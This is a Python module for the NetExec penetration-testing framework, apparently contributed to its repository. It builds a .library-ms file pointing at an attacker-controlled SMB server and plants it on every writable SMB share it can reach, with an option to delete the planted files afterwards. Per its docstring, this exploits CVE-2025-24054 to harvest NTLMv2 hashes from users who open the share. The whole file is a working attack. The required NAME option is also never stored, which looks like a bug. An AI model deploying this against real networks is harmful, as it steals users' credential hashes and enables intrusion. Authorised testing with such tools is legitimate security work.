import ntpath
from nxc.paths import TMP_PATH
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Requested by the issue #652, heavily inspired by drop-sc, scuffy and slinky modules
    https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/
    https://cti.monster/blog/2025/03/18/CVE-2025-24071.html
    Module by: @XedSama
    """
    name = "drop-library-ms"
    description = "Creates and uploads an arbitrary .library-ms on writable shares, leveraging CVE-2025-24054 for looting NTLMv2 hash"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.ignore_shares = ["C$", "ADMIN$", "NETLOGON", "SYSVOL"]

        self.server = None
        self.lms_name = ""
        self.cleanup = False

        self.local_path = None
        self.remote_path = None

    def options(self, context, module_options):
        """
        SERVER      Attacker machine
        NAME        File name
        IGNORE      Specific shares to ignore (comma separated, default: C$,ADMIN$,NETLOGON,SYSVOL)
        CLEANUP     Cleaning option (True or False)
        """
        if "SERVER" not in module_options and not self.cleanup:
            context.log.fail("SERVER option is required")
            exit(1)

        if "NAME" not in module_options:
            context.log.fail("NAME option is required!")
            exit(1)

        if "IGNORE" in module_options:
            self.ignore_shares = module_options["IGNORE"].split(",")
            context.log.debug(f"Ignoring shares: {self.ignore_shares}")

        if "CLEANUP" in module_options:
            self.cleanup = bool(module_options["CLEANUP"])
            context.log.debug(f"CLEANUP is set to {self.cleanup}")

        self.local_path = f"{TMP_PATH}/{self.lms_name}.library-ms"
        self.remote_path = ntpath.join("\\", f"{self.lms_name}.library-ms")

        if not self.cleanup:
            self.server = module_options["SERVER"]
            with open(self.local_path, "w", encoding="utf-8") as libms:
                libms.truncate(0)
                libms.write('<?xml version="1.0" encoding="UTF-8"?>')
                libms.write('<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">')
                libms.write("<searchConnectorDescriptionList>")
                libms.write("<searchConnectorDescription>")
                libms.write("<simpleLocation>")
                libms.write(f"<url>\\\\{self.server}\\LIBRARY</url>")
                libms.write("</simpleLocation>")
                libms.write("</searchConnectorDescription>")
                libms.write("</searchConnectorDescriptionList>")
                libms.write("</libraryDescription>")

    def on_login(self, context, connection):
        shares = connection.shares()
        for share in shares:
            if "WRITE" in share["access"] and share["name"] not in self.ignore_shares:
                context.log.success(f"Found writable share : {share['name']}")

                if self.cleanup:
                    try:
                        connection.conn.deleteFile(share["name"], self.remote_path)
                        context.log.success(f"Deleted .library-ms file on share '{share['name']}'")
                    except Exception as e:
                        context.log.fail(f"Error deleting .library-ms file on share '{share['name']}' : {e}")

                else:
                    with open(self.local_path, "rb") as libms:
                        try:
                            connection.conn.putFile(share["name"], self.remote_path, libms.read)
                            context.log.success(f"Created .library-ms file on share '{share['name']}'")
                        except Exception as e:
                            context.log.fail(f"Error writing .library-ms file on share '{share['name']}' : {e}")
